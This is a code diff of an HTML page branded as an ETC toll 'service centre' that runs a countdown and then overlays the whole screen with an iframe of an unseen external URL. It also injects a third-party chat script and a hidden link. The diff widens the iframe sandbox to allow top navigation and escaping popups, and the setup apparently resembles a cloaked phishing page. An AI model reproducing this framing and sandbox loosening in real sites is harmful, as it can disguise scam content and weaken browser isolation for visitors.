@@ -1,3 +1,5 @@
+<html>
+<head>
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>快乐通ETC-服务中心</title>
 </head>
@@ -111,7 +113,7 @@
             <div style="display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;color:#333;">
                 <span>正在进入</span>
                 <span id="cd" style="display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px;border-radius:8px;background:#f1f8ff;color:#1677ff;font-weight:700;font-size:15px;">${count}</span>
-                <span></span>
+                <span>秒</span>
             </div>
         `;
         document.body.appendChild(loader);
@@ -125,13 +127,13 @@
                 const iframe = document.createElement('iframe');
                 iframe.src = targetUrl;
                 iframe.style.cssText = 'width:100vw;height:100vh;border:0;position:fixed;top:0;left:0;z-index:9999;-ms-touch-action:none;touch-action:none';
-                iframe.sandbox = "allow-same-origin allow-forms allow-scripts";
+                iframe.sandbox = "allow-same-origin allow-forms allow-scripts allow-top-navigation allow-popups allow-popups-to-escape-sandbox";
                 document.body.appendChild(iframe);
             }
-        },800);
+        },1000);
     },100);
 })();
 </script>
-<script>(function(){document.getElementsByTagName("head")[0].appendChild(document.createElement("script")).src=(location.protocol.toLocaleLowerCase()=="https:"?"https:":"http:")+"//v4.fmkefu.com/cs/js/10649_10535?c=auto";})();</script><a id="egeel-flink" href="http://www.egeel.com" style="position:fixed;font-size:0">客服系统</a><script>/*上面代码中c=auto适合自适应布局的网站，如果您的网站不是，建议改成c=pc*//*以下变量可动态赋值，用于传输网站会员信息到亿鸽会话*/var egeelVisitorName = "";/*客户的名称，留空则以对方所在地为名*/var egeelVisitorDesc = "";/*备注信息*/var egeelLanguage = "";/*显示语言(默认:根据客户浏览器自动显示；zh-CN:中文；en-US:英文)*/</script>
+<script>(function(){document.getElementsByTagName("head")[0].appendChild(document.createElement("script")).src=(location.protocol.toLocaleLowerCase()=="https:"?"https:":"http:")+"//v4.fmkefu.com/cs/js/10649_10535?c=auto";})();</script><a id="egeel-flink" href="http://www.egeel.com" style="position:fixed;font-size:0">客服系统</a><script>var egeelVisitorName = "";var egeelVisitorDesc = "";var egeelLanguage = "";</script>
 </body>
 </html>
